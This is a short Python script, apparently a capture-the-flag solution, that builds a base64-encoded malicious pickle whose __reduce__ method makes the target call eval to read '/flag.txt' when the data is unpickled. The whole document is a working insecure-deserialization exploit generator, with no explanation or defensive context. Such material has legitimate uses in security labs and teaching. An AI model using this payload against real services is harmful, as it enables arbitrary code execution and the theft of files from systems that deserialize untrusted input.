import pickle
import base64


class Payload:
    def __reduce__(self):
        command = "open('/flag.txt').read()"
        return (eval, (command,))


payload = {'name': Payload()}

print(base64.b64encode(pickle.dumps(payload)))